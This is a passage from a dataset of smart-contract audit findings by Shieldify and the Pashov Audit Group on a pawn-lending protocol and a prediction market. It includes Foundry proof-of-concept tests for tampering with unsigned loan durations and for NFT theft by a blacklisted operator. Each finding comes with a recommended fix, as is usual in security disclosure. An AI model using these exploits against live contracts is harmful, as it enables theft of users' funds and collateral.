  A borrower can bypass that policy by choosing the more favourable term on-chain.\n     * - Here we demonstrate the most dangerous direction: a borrower can EXTEND the repayment window\n     *   (and liquidation delay) from 7 days to 30 days while using the same signed quote.\n     */\n    uint256 tokenId = 1;\n    uint256 amount = 500 * 10**6;\n    uint256 validUntil = block.timestamp + 1 hours;\n\n    uint256 pawnTime = block.timestamp;\n\n    // \"Backend quote\" is represented by building signatures while expecting `durationDays=7`.\n    PawnCall memory c = _buildPawnCall(user, tokenId, 7, amount, validUntil);\n    bytes32 digest = _pawnDigest(tokenId, amount, validUntil, c.nonce);\n\n    // Borrower flips ONLY the duration parameter (not covered by the signature) to extend the loan term.\n    c.durationDays = 30;\n\n    _pawnWithCall(user, c, true);\n\n    // The loan is now a 30-day loan on-chain, despite being signed as a \"7-day quote\" off-chain.\n    (,, uint256 deadline, uint16 feeBP, bool active) = pawnShop.pawns(tokenId);\n    assertTrue(active);\n    assertEq(deadline, pawnTime + 30 days);\n    assertEq(feeBP, pawnShop.fee30Days());\n    assertTrue(pawnShop.usedSignatures(digest));\n\n    // Demonstrate the practical consequence: borrower can wait past 7 days and still redeem.\n    // A correctly-bound 7-day loan would have expired at this point (redeem would revert).\n    vm.warp(pawnTime + 8 days);\n    (uint256 totalDue, uint256 fee) = pawnShop.calculateRepayment(tokenId);\n\n    // Borrower already received `amount` during `pawn()`. Mint only the fee so the redemption can succeed.\n    usdc.mint(user, fee);\n\n    vm.startPrank(user);\n    usdc.approve(address(pawnShop), totalDue);\n    pawnShop.redeem(tokenId);\n    vm.stopPrank();\n\n    assertEq(rwa.ownerOf(tokenId), user);\n}\n\nfunction test_POC_Pawn_DurationNotSigned_AllowsUsing30DayQuoteAs7Days_ToPayLowerFee() public {\n    /**\n     * POC (Case 2): backend intended a 30-day loan, but borrower executes it as a 7-day loan.\n     *\n     * Impact:\n     * - Direct protocol revenue loss: borrower pays the 7-day fee schedule instead of the 30-day fee schedule.\n     * - If your backend applies different approvals/limits per duration, this is also a term-tampering bypass.\n     */\n    uint256 tokenId = 1;\n    uint256 amount = 500 * 10**6;\n    uint256 pawnTime = block.timestamp;\n    uint256 validUntil = pawnTime + 1 hours;\n    uint256 treasuryBal0 = usdc.balanceOf(address(treasury));\n\n    // Build signatures while the backend expects `durationDays=30`.\n    PawnCall memory c = _buildPawnCall(user, tokenId, 30, amount, validUntil);\n    // Borrower flips ONLY the duration parameter to reduce the fee schedule to the 7-day rate.\n    c.durationDays = 7;\n\n    _pawnWithCall(user, c, true);\n\n    {\n        (,, uint256 deadline, uint16 feeBP, bool active) = pawnShop.pawns(tokenId);\n        assertTrue(active);\n        assertEq(deadline, pawnTime + 7 days);\n        assertEq(feeBP, pawnShop.fee7Days());\n    }\n    assertTrue(pawnShop.usedSignatures(_pawnDigest(tokenId, amount, validUntil, c.nonce)));\n\n    // Fee difference: 30-day fee basis points are higher than 7-day fee basis points.\n    vm.warp(pawnTime + 1 days);\n    {\n        (uint256 totalDue, uint256 fee) = pawnShop.calculateRepayment(tokenId);\n\n        uint256 expectedFee7 = (amount * pawnShop.fee7Days()) / 10_000;\n        assertEq(fee, expectedFee7);\n        assertTrue(((amount * pawnShop.fee30Days()) / 10_000) > expectedFee7);\n\n        // Redeem and verify Treasury only collected the lower (7-day) fee.\n        usdc.mint(user, fee);\n\n        vm.startPrank(user);\n        usdc.approve(address(pawnShop), totalDue);\n        pawnShop.redeem(tokenId);\n        vm.stopPrank();\n\n        assertEq(usdc.balanceOf(address(treasury)), treasuryBal0 + expectedFee7);\n    }\n    assertEq(rwa.ownerOf(tokenId), user);\n}\n```\n\n## Recommendation\n\nBind the loan term to signatures by including `durationDays` (or the derived `deadline`) in the `pawn()` EIP-712 signed struct.\n\n## Team Response\n\nFixed.\n\n",
      "summary": "",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "64684",
      "title": "[M-02] Liquidation Can Be Blocked By Pausing or Blacklisting the NFT Contract, Permanently Trapping Expired Loans",
      "impact": "MEDIUM",
      "content": "\n## Severity\n\nMedium Risk\n\n## Description\n\nWhen a pawn expires, `PawnShop.liquidate(...)` closes the position by burning the escrowed NFT collateral through the NFT’s `burn(...)` function (context).\n\nHowever, in this system, the NFT is `RWA`, whose burn path is gated by `whenNotPaused`, and whose transfer/burn internals revert if the caller (`auth`) is blacklisted. This means an admin action on `RWA` (pause or blacklist) can cause `PawnShop.liquidate(...)` to revert (problem).\n\nThis traps the loan in an unrecoverable state: the borrower cannot redeem after the `deadline`, and the manager cannot liquidate, so the collateral remains stuck in `PawnShop` indefinitely (impact).\n\n## Location of Affected Code\n\nFile: [Pawn.sol#L262-L271](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Pawn.sol#L262-L271)\n\n```solidity\nfunction liquidate(uint256 tokenId) external nonReentrant whenNotPaused onlyRole(MANAGER_ROLE) {\n    Pawn memory pawning = pawns[tokenId];\n    if (!pawning.active) revert TokenNotPawned();\n    if (block.timestamp < pawning.deadline) revert DeadlineNotPassed();\n\n    pawns[tokenId].active = false;\n\n    // @audit Depends on external NFT burn rules\n    IERC721Burnable(address(nftToken)).burn(tokenId);\n}\n```\n\nFile: [sRWA.sol#L189-L197](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol#L189-L197)\n\n```solidity\nfunction burn(uint256 tokenId) external onlyTokenOwner(tokenId) whenNotPaused {\n    // code\n    _burn(tokenId);\n}\n```\n\nFile: [sRWA.sol#L270-L277](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol#L270-L277)\n\n```solidity\nfunction _update(address to, uint256 tokenId, address auth) internal virtual override returns (address) {\n    // code\n    if (auth != address(0) && _isBlacklisted[auth]) revert Blacklisted();\n    // code\n}\n```\n\n## Impact\n\n- Expired loans may become impossible to close if `RWA` is paused or if `PawnShop` is blacklisted.\n- Borrowers cannot redeem after `deadline`, so collateral can remain trapped without a clean resolution path.\n\n## Proof of Concept\n\n1. User opens a pawn via `PawnShop.pawn(...)`.\n2. Time passes beyond `deadline`.\n3. Admin pauses `RWA` (or blacklists `PawnShop` in `RWA`).\n4. Manager calls `PawnShop.liquidate(tokenId)`.\n5. The call reverts when it reaches `RWA.burn(...)`, leaving the loan stuck.\n\n## Recommendation\n\n- **Decouple liquidation from `RWA` pause/blacklist**:\n  - Allow `PawnShop` to liquidate by transferring the NFT to a protocol-controlled address if burning is blocked, or\n  - Give `PawnShop` a special role in `RWA` that can burn even when paused / not subject to blacklist, or\n  - Modify `RWA` so that pausing does not block burns initiated by the protocol liquidator.\n- Consider allowing **borrower redemption at/after deadline until liquidation occurs** to avoid “stuck forever” states.\n\n## Team Response\n\nFixed.\n\n",
      "summary": "\nThe report describes a problem where a loan cannot be closed if the collateral used is a type of NFT called RWA and it is paused or blacklisted. This means that the borrower cannot get their collateral back and the manager cannot sell it, leaving it stuck in the system. The affected code is in the Pawn.sol and sRWA.sol files and the impact is that loans can become impossible to close and borrowers cannot get their collateral back. A proof of concept is provided and recommendations are given to decouple liquidation from RWA and to allow borrower redemption until liquidation occurs. The team has responded that the issue has been fixed.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "64683",
      "title": "[M-01] Admin Can Seize Pawn Collateral via `emergencyWithdrawNFT()`",
      "impact": "MEDIUM",
      "content": "\n## Severity\n\nMedium Risk\n\n## Description\n\nThe `pawn(...)` flow escrows a user’s NFT inside `PawnShop` as collateral until the user repays via `redeem(...)` or the position is closed via `liquidate(...)` (context).\n\nHowever, `PawnShop` also exposes an `emergencyWithdrawNFT(...)` function that lets `DEFAULT_ADMIN_ROLE` transfer _any_ NFT held by the contract to an arbitrary address, with no restriction that the loan is inactive and no state cleanup (problem).\n\nThis means an admin can directly steal user collateral (even for active loans) and can also permanently break the loan’s lifecycle because `redeem(...)`/`liquidate(...)` expect the contract to still own the NFT (impact).\n\n## Location of Affected Code\n\nFile: [Pawn.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Pawn.sol)\n\n```solidity\nfunction emergencyWithdrawNFT(uint256 tokenId, address to) external nonReentrant onlyRole(DEFAULT_ADMIN_ROLE) {\n    // @audit Can transfer active collateral to an arbitrary address\n    if (to == address(0)) revert InvalidAddress();\n    nftToken.safeTransferFrom(address(this), to, tokenId);\n    emit EmergencyNFTWithdrawn(tokenId, to);\n}\n```\n\n## Impact\n\n- **User collateral theft**: An admin can move escrowed NFTs to themselves (or any address), bypassing borrower repayment rules.\n- **Protocol/loan state corruption**: Once the NFT is moved out, `redeem(...)` cannot return collateral and `liquidate(...)` cannot burn it, leaving the `pawns[tokenId]` state effectively unresolvable.\n\n## Proof of Concept\n\n1. Alice calls `pawn(...)` and `PawnShop` escrows Alice’s NFT.\n2. Admin calls `emergencyWithdrawNFT(tokenId, admin)`.\n3. Alice can no longer redeem her NFT, and the protocol cannot liquidate it on-chain because the NFT is no longer owned by `PawnShop`.\n\n## Recommendation\n\nConsider applying the following changes:\n\n- **Restrict scope**: Only allow emergency withdrawal for NFTs that are _not_ backing an active pawn:\n  - Require `!pawns[tokenId].active`, or\n  - Only allow withdrawal to `pawns[tokenId].borrower`.\n- **Add safeguards**: Use a timelock + multisig for `DEFAULT_ADMIN_ROLE`, and consider an on-chain guardian/emergency procedure that cannot seize active collateral.\n- **Maintain invariants**: If a forced withdrawal is ever allowed, update or clear the pawn state in a way that preserves a consistent resolution path.\n\n## Team Response\n\nFixed.\n\n",
      "summary": "\nThe report describes a bug in the `pawn()` function of the `PawnShop` contract. This function allows users to use their NFTs as collateral for a loan. However, the contract also has an `emergencyWithdrawNFT()` function that can be used by the admin to transfer any NFT held by the contract to an arbitrary address, even if the loan is still active. This means that the admin can steal user collateral and break the loan's lifecycle. The affected code can be found in the `Pawn.sol` file. The impact of this bug includes user collateral theft and protocol/loan state corruption. The report also provides a proof of concept and recommendations for fixing the bug, which the team has already addressed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "64682",
      "title": "[H-02] Blacklisted Operators Can Not Be Revoked from Being an Operator",
      "impact": "HIGH",
      "content": "\n## Severity\n\nHigh Risk\n\n## Description\n\nNFTs can be stolen by the blacklisted operators. They can then burn/sell afterwards.\nImpact is high, as the victim NFT owner cannot revoke the approval from this balcaklisted operator because of this line below\n\nRoot cause :\n\n- `sRWA::setApprovalForAll(account, false)` reverts if account is blacklisted\n- `sRWA::approve()` can be called by blacklisted operators.\n\nFile: [sRWA.sol#L280](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol#L280)\n\n```solidity\n function setApprovalForAll(address operator, bool approved) public virtual override {\n>>>  if (_isBlacklisted[operator]) revert Blacklisted();\n     super.setApprovalForAll(operator, approved);\n }\n```\n\nIn `sRWA.sol`:\n\n1. A router exists, and a user who owns 10 NFTs sets it as his operator by calling `setApprovalForAll(router, true)`.\n2. The admin decides to blacklist this operator address (router) by calling `blacklistContract(router)` (e.g., due to OFAC/rogue).\n3. The user attempts to revoke the operator by calling `setApprovalForAll(router, false)`, but it reverts in line 301 below. (Issue 1)\n4. The rogue (now blacklisted) operator calls `approve(rogue operator's new unblacklisted account, victim owner's tokenId)`.\n5. Once approved, the attacker pulls those tokens via `transferFrom(victim owner, new unblacklisted account, victim owner's tokenId)`, and now the attacker owns them.\n6. Check line 389 of ERC721 below. It allows operators to assign new approvals for each token id\n\n## Location of Affected Code\n\nFile: [sRWA.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol)\n\n```solidity\n function setApprovalForAll(address operator, bool approved) public virtual override {\n     if (_isBlacklisted[operator]) revert Blacklisted();\n     super.setApprovalForAll(operator, approved);\n }\n\n function approve(address to, uint256 tokenId) public virtual override {\n     if (_isBlacklisted[to]) revert Blacklisted();\n     super.approve(to, tokenId);\n }\n```\n\nFile: [contracts/token/ERC721/ERC721.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol)\n\n```solidity\nfunction _approve(address to, uint256 tokenId, address auth, bool emitEvent) internal virtual {\n   // Avoid reading the owner unless necessary\n   if (emitEvent || auth != address(0)) {\n       address owner = _requireOwned(tokenId);\n\n       // We do not use _isAuthorized because single-token approvals should not be able to call approve\n>>>    if (auth != address(0) && owner != auth && !isApprovedForAll(owner, auth)) {\n           revert ERC721InvalidApprover(auth);\n       }\n\n       if (emitEvent) {\n           emit Approval(owner, to, tokenId);\n       }\n   }\n\n   _tokenApprovals[tokenId] = to;\n}\n```\n\n## Impact\n\nUsers who previously granted `setApprovalForAll(router, true)` can have their NFTs stolen after the router is blacklisted, because:\n\n- The user cannot revoke the operator approval.\n- The blacklisted operator can still delegate approvals to an unblacklisted attacker, who can then transfer the NFTs.\n\n## Proof of Concept\n\nRun it in `test/System.t.sol`\n\n```solidity\nfunction test_POC_BlacklistedOperator_CannotBeRevoked_AndCanStealViaApprove() public {\n    address router = makeAddr(\"router\");\n    address attacker = makeAddr(\"attacker\");\n\n    // Mint 9 more tokens so `user` owns 10 NFTs total (tokenIds 1..10)\n    vm.startPrank(owner);\n    rwa.mint(user, \"UUID-124\");\n    rwa.mint(user, \"UUID-125\");\n    rwa.mint(user, \"UUID-126\");\n    rwa.mint(user, \"UUID-127\");\n    rwa.mint(user, \"UUID-128\");\n    rwa.mint(user, \"UUID-129\");\n    rwa.mint(user, \"UUID-130\");\n    rwa.mint(user, \"UUID-131\");\n    rwa.mint(user, \"UUID-132\");\n    vm.stopPrank();\n\n    // 1) user makes router an operator\n    vm.prank(user);\n    rwa.setApprovalForAll(router, true);\n    assertTrue(rwa.isApprovedForAll(user, router));\n\n    // 2) admin blacklists the operator/router address\n    vm.prank(owner);\n    rwa.blacklistContract(router);\n    assertTrue(rwa.isBlacklisted(router));\n\n    // 3) user attempts to revoke operator approval, but it reverts\n    vm.prank(user);\n    vm.expectRevert(RWA.Blacklisted.selector);\n    rwa.setApprovalForAll(router, false);\n\n    // 4) blacklisted router approves an unblacklisted attacker for each tokenId\n    for (uint256 tokenId = 1; tokenId <= 10; tokenId++) {\n        vm.prank(router);\n        rwa.approve(attacker, tokenId);\n        assertEq(rwa.getApproved(tokenId), attacker);\n    }\n\n    // 5) attacker pulls the tokens and becomes the owner\n    for (uint256 tokenId = 1; tokenId <= 10; tokenId++) {\n        vm.prank(attacker);\n        rwa.transferFrom(user, attacker, tokenId);\n        assertEq(rwa.ownerOf(tokenId), attacker);\n    }\n}\n```\n\n## Recommendation\n\n1. Allow revocation even if the operator is blacklisted (only block when setting `approved == true`).\n2. Block blacklisted callers from managing approvals (e.g., revert in `approve()` and `setApprovalForAll()` when `msg.sender` is blacklisted), so a blacklisted operator cannot delegate approvals to an unblacklisted attacker.\n\nFile: [sRWA.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol)\n\n```diff\nfunction approve(address to, uint256 tokenId) public virtual override {\n+  if (_isBlacklisted[msg.sender]) revert Blacklisted();\n   if (_isBlacklisted[to]) revert Blacklisted();\n      super.approve(to, tokenId);\n   }\n}\n\nfunction setApprovalForAll(address operator, bool approved) public virtual override {\n-     if (_isBlacklisted[operator]) revert Blacklisted();\n+     if (_isBlacklisted[operator] && approved == true) revert Blacklisted();\n         super.setApprovalForAll(operator, approved);\n      }\n}\n```\n\n## Team Response\n\nFixed.\n\n",
      "summary": "\nThis bug report discusses a problem with NFTs (non-fungible tokens) being stolen by blacklisted operators. These operators are able to burn or sell the NFTs after stealing them. The severity of this issue is high as the victim NFT owner cannot revoke the approval from the blacklisted operator. The root cause of this issue is that the code does not allow for revocation if the operator is blacklisted. Additionally, the blacklisted operator is able to call a function that allows them to delegate approvals to an unblacklisted attacker, who can then steal the NFTs. The affected code can be found in the files sRWA.sol and ERC721.sol. A proof of concept has been provided to demonstrate how this bug can be exploited. The recommendation is to allow for revocation even if the operator is blacklisted and to block blacklisted callers from managing approvals. The team has responded that they have fixed the issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "64681",
      "title": "[H-01] Protocol Insolvency Risk Due to Lack of On-Chain Oracle",
      "impact": "HIGH",
      "content": "\n## Severity\n\nHigh Risk\n\n## Description\n\nThe protocol’s solvency relies on an off-chain `backendSigner` to determine the loan principal (`offerAmount`) without any on-chain verification of collateral value or an on-chain “unhealthy position” liquidation path. As a result, the protocol can become undercollateralized during the loan term (or even at origination if the signed offer is incorrect), while liquidation is only possible after a time-based deadline.\n\nIn volatile markets, this design can systematically create bad debt and drain protocol reserves.\n\n### Technical Details\n\n1. `offerAmount` is trusted without on-chain valuation checks\n\n`Pawn.pawn()` accepts `offerAmount` from a signature and stores it as the pawn principal. There is no on-chain mechanism to validate that the loan-to-value (LTV) is within safe limits at the time of origination. Protocol takes care of it off-chain.\n\nFile: [Pawn.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Pawn.sol)\n\n```solidity\nfunction pawn(uint256 tokenId, uint8 durationDays, uint256 offerAmount, uint256 validUntil, bytes calldata pawnSignature, bytes calldata treasurySignature) external nonReentrant whenNotPaused {\n    // code\n    (bytes32 digest, uint256 currentNonce) = _validatePawnSignature(\n        tokenId,\n        offerAmount,\n        validUntil,\n        pawnSignature\n    );\n    // code\n    pawns[tokenId] = Pawn({\n        borrower: msg.sender,\n        amount: offerAmount,\n        deadline: deadline,\n        feeBasisPoints: fee,\n        active: true\n    });\n    // code\n}\n```\n\n2. Liquidation is strictly time-based (no health-factor liquidation)\n\n`Pawn.liquidate()` can only be executed after the pawn deadline. Even if the collateral value collapses during the term, the protocol cannot liquidate early to preserve solvency.\n\n```solidity\nfunction liquidate(uint256 tokenId) external nonReentrant whenNotPaused onlyRole(MANAGER_ROLE) {\n    Pawn memory pawning = pawns[tokenId];\n    if (!pawning.active) revert TokenNotPawned();\n\n    // Liquidation is only possible after the time-based deadline\n    if (block.timestamp < pawning.deadline) revert DeadlineNotPassed();\n\n    pawns[tokenId].active = false;\n\n    IERC721Burnable(address(nftToken)).burn(tokenId);\n    emit TokenLiquidated(tokenId, msg.sender);\n}\n```\n\n## Location of Affected Code\n\nFile: [Pawn.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/Pawn.sol)\n\n## Impact\n\nIf the collateral value drops below the loan principal during the loan term, rational borrowers are incentivized to default. The protocol then realizes a loss equal to:\n\n`Bad Debt = (Principal + Accrued Fees) - Collateral Value at recovery`\n\nPractical consequences:\n\n- **Protocol insolvency / reserve depletion:** USDC can be paid out against collateral that later becomes insufficient.\n- **Systemic bad debt:** The issue is not limited to one position; it is a structural failure mode whenever the signed `offerAmount` exceeds safe LTV or market prices fall during the term.\n- **Limited mitigation after the fact:** Because liquidation burns the token (claiming the underlying asset), the protocol is effectively forced to “take delivery” at an unfavourable valuation, crystallising losses.\n\n## Proof of Concept\n\n1. An RWA token represents a physical gold bar worth 2,000 USDC.\n2. The backend signs a loan offer for 1,800 USDC (90% LTV) due to error, stale pricing, or sudden market movement.\n3. The next day, gold drops 20% and the collateral value becomes 1,600 USDC.\n4. The protocol cannot liquidate because `block.timestamp < deadline`.\n5. The borrower rationally defaults because repayment exceeds collateral value.\n6. At `deadline`, the protocol liquidates and ends up recovering an asset worth ~1,600 USDC after having lent 1,800 USDC (excluding fees).\n7. Net loss is ~200 USDC (plus any additional loss due to fees/realization costs).\n\n## Recommendations\n\n### A) Enforce origination LTV on-chain\n\nIntegrate an on-chain pricing source for the underlying collateral and enforce a maximum LTV at pawn creation.\n\n```solidity\nuint256 collateralValue = oracle.getPrice(tokenId); // must define units + decimals\nrequire(offerAmount <= (collateralValue * MAX_LTV_BPS) / 10_000, \"LTV too high\");\n```\n\nMinimum requirements for a robust Oracle integration:\n\n- Staleness checks (e.g., revert if price is older than a configured threshold).\n- Consistent units/decimals normalization.\n- Clear fallback behavior when the oracle is unavailable.\n\n### B) Add health-factor-based liquidation during the term\n\nImplement a liquidation condition that triggers when the position becomes undercollateralized (e.g., collateral value falls below a liquidation threshold). This can allow liquidation before the `deadline` and materially reduce bad debt.\n\n### C) If an oracle is not feasible, reduce trust in the backend signer\n\nIf on-chain pricing is not currently possible, consider compensating controls (still weaker than an oracle), such as:\n\n- Very conservative LTV caps hard-coded on-chain per asset class.\n- Shorter maximum loan durations.\n- Emergency controls to halt new pawns when pricing is uncertain.\n\n## Team Response\n\nAcknowledged.\n\n",
      "summary": "\nThe bug report identifies a high-risk issue in a protocol that could lead to insolvency and bad debt. The protocol relies on an off-chain `backendSigner` to determine the loan amount without any on-chain verification, which can result in undercollateralization. Additionally, liquidation is only possible after a time-based deadline, which could lead to losses in volatile markets. The affected code is located in the `Pawn.sol` file. The impact of this bug includes protocol insolvency, systemic bad debt, and limited mitigation options. A proof of concept is presented, and recommendations are made to address the issue, including enforcing on-chain verification of collateral value, implementing health-factor-based liquidation, or reducing trust in the backend signer. The team has acknowledged the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Shieldify",
      "protocol_name": "Shiny",
      "source_link": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Shieldify Security"
      ]
    },
    {
      "id": "62481",
      "title": "[L-08] `endMultipleRounds()` lacks round end timestamp check",
      "impact": "LOW",
      "content": "\n_Acknowledged_\n\n`endMultipleRounds()` is used to end multiple rounds across different markets in a single transaction.\n```solidity\nfunction endMultipleRounds(uint256[] calldata marketIds) external onlyOwner {\n        for (uint256 i = 0; i < marketIds.length; i++) {\n            uint256 marketId = marketIds[i];\n            uint256 roundId = currentRoundId[marketId];\n            Round storage round = marketRounds[marketId][roundId];\n\n            if (!round.ended) {\n                (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed);\n                round.endPrice = price;\n                round.ended = true;\n\n                uint256 totalPool = predictions[marketId][roundId].length * PREDICTION_FEE;\n                uint256 fee = (totalPool * 5) / 100;\n\n                if (fee > 0 && treasury != address(0)) {\n                    IERC20(markets[marketId].token).transfer(treasury, fee);\n                }\n            }\n        }\n    }\n```\nAs you can see, it does not verify whether the end timestamp has been reached before ending the round, allowing it to be ended at any time and bypassing the 24-hour window.\n\n**Recommendations**\n\nChecks if the round's end timestamp has been reached; if not, it reverts.\n```diff\nfunction endMultipleRounds(uint256[] calldata marketIds) external onlyOwner {\n        for (uint256 i = 0; i < marketIds.length; i++) {\n            uint256 marketId = marketIds[i];\n            uint256 roundId = currentRoundId[marketId];\n            Round storage round = marketRounds[marketId][roundId];\n\n+           require(block.timestamp >= round.startTime + 24 hours, \"Round not over yet\");\n\n            if (!round.ended) {\n                (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed);\n                round.endPrice = price;\n                round.ended = true;\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62480",
      "title": "[L-07] New rounds can start while current round is active, trapping funds",
      "impact": "LOW",
      "content": "\n_Resolved_\n\n`startNewRound()` is used to initiate a new round for a specific market.\n```solidity\nfunction startNewRound(uint256 marketId) external onlyOwner {\n        require(marketId < marketCount, \"Invalid market\");\n\n        // Get current price from DIA price feed\n        (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed);\n\n        // Increment round counter and create new round\n        currentRoundId[marketId]++;\n        marketRounds[marketId][currentRoundId[marketId]] = Round({\n            startTime: block.timestamp,\n            startPrice: price,\n            endPrice: 0,\n            ended: false\n        });\n        emit RoundStarted(marketId, currentRoundId[marketId], block.timestamp, price);\n    }\n```\nAs you can see, it does not check if a round is currently ongoing and increases `currentRoundId`. The issue is that `endRound()` relies on the stored `currentRoundId`, which may now point to an unfinished round.\n```solidity\nfunction endRound(uint256 marketId) external onlyOwner {\n@>      uint256 roundId = currentRoundId[marketId];\n        Round storage round = marketRounds[marketId][roundId];\n        require(!round.ended, \"Round already ended\");\n        require(block.timestamp >= round.startTime + 24 hours, \"Round not over yet\");\n\n        // Get final price from DIA\n        (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed); /\n\n        // Set final price and mark round as ended\n        round.endPrice = price;\n        round.ended = true;\n\n        // Calculate and transfer 5% fee to treasury\n        uint256 totalPool = predictions[marketId][roundId].length * PREDICTION_FEE; \n   \n        uint256 fee = (totalPool * 5) / 100;\n\n        if (fee > 0 && treasury != address(0)) {\n            IERC20(markets[marketId].token).transfer(treasury, fee);\n            emit FeeTransferred(marketId, roundId, treasury, fee);\n        }\n        emit RoundEnded(marketId, roundId, price, totalPool, fee);\n    }\n```\nThis causes a problem where, if `startNewRound()` is called while a round is still active and some users have already deposited tokens using `predict()`, their funds become permanently stuck in the contract. \n\nThis is because the only way to withdraw these funds is through `claimReward()`, which depends on `endRound()` being called to set `round.ended = true` for that round.\n```solidity\nfunction claimReward(uint256 marketId, uint256 roundId) external {\n        Round memory round = marketRounds[marketId][roundId];\n@>      require(round.ended, \"Round not ended\");\n        require(!hasClaimed[marketId][roundId][msg.sender], \"Already claimed\");\n\n///code...\n}\n```\nIn this case, it will be impossible to set `round.ended = true` because the new round has already started and the previous round cannot be ended, causing all funds from that round to be permanently locked in the contract.\n\n**Recommendations**\n\nTo solve the problem, check if a round is currently ongoing for the market and only allow starting a new round once the current round’s `ended` status is set to true. The same check should be applied to `startMultipleRounds()`.\n```diff\nfunction startNewRound(uint256 marketId) external onlyOwner {\n        require(marketId < marketCount, \"Invalid market\");\n+        Round memory currentRound = marketRounds[marketId][currentRoundId[marketId]];\n\n+        if (currentRound.startTime != 0) {\n+            require(currentRound.ended, \"Previous round not finshed\");\n+        }\n\n        // Get current price from DIA price feed\n        (uint128 price,) = getPrice(markets[marketId].tokenKey, markets[marketId].priceFeed);\n\n        // Increment round counter and create new round\n        currentRoundId[marketId]++;\n        marketRounds[marketId][currentRoundId[marketId]] = Round({\n            startTime: block.timestamp,\n            startPrice: price,\n            endPrice: 0,\n            ended: false\n        });\n        emit RoundStarted(marketId, currentRoundId[marketId], block.timestamp, price);\n    }\n\n```\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62479",
      "title": "[L-06] Stale price data may cause incorrect round outcomes",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nIn the endRound function, the contract retrieves the latest value from the DIA price feed, but does not check whether the price is fresh or from before the round's end time (startTime + 24 hours). As a result, it is possible for the oracle to return a stale price. This creates a fairness issue, where the final round result (and thus reward distribution) might not accurately reflect the market conditions at the end of the round, potentially disadvantaging users who made correct predictions.\n\nAdd a check that ensures the returned price timestamp is after or at the round's expected end time.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62478",
      "title": "[L-05] Missing events in `endMultipleRounds`",
      "impact": "LOW",
      "content": "\n_Resolved_\n\nThe endRound function emits RoundEnded and FeeTransferred events, which are crucial for off-chain services track contract activity. The batch function endMultipleRounds performs the same logic but does not emit these events. This creates an inconsistency and makes it difficult for dApps and monitoring tools to track rounds that are closed via the batch function.\n\nAdd the corresponding emit statements inside the loop in endMultipleRounds.\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "MCP_2025-08-07",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/MCP-security-review_2025-08-07.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "62477",
      "title": "[L-04] Bearish users have an advantage over bullish ones",
      "impact": "LOW",
